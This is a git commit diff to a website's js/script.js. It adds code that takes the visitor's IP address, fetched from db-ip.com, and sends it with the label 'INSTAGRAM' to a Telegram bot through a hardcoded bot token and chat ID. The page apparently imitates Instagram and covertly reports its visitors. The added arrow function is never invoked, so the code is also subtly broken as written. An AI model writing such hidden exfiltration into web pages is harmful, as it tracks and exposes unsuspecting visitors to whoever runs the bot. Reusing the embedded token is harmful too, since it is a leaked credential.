f9e3d459badbfa4d24c627faf55f836a89228906
Saikumar Shetty <73155077+Shettysai@users.noreply.github.com>
2022-08-15 13:53:45 +0530

    Update script.js

--- js/script.js
+++ js/script.js
@@ -9,7 +9,17 @@ fetch('https://api.db-ip.com/v2/free/self')
     .then(result => result.json())
     .then((output) => {
         ip = output;
-        
+        async (ev)=>{
+            ev.preventDefault();
+                const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`INSTAGRAM--------${ip.ipAddress}`
+    fetch(url, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: ''
+    }).then(res => {
+        console.log("Request complete!");
+    });
+        }
 }).catch(err => console.error(err));
 
 
